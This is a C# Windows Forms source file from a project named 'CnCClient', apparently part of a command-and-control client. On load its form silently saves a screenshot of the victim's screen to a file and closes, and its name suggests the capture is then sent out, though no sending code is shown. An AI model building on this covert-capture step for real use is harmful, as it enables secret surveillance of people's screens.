using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CnCClient
{
    public partial class TakeAndSendS : Form
    {
        public TakeAndSendS()
        {
            InitializeComponent();
        }

        private void TakeAndSendS_Load(object sender, EventArgs e)
        {
            ScreenCapture sc = new ScreenCapture();

            Assembly GetPath = Assembly.GetExecutingAssembly();
            sc.CaptureScreenToFile("Pic", ImageFormat.Png);
            this.Close();
        }
    }
}
